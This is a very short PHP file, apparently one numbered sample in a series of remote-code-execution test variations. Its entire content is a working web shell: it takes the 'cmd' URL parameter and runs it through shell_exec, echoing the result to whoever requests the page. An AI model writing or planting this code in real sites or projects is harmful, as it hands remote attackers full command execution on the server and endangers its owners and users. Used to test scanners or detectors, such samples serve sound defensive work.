<?php
// RCE test variation #540
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>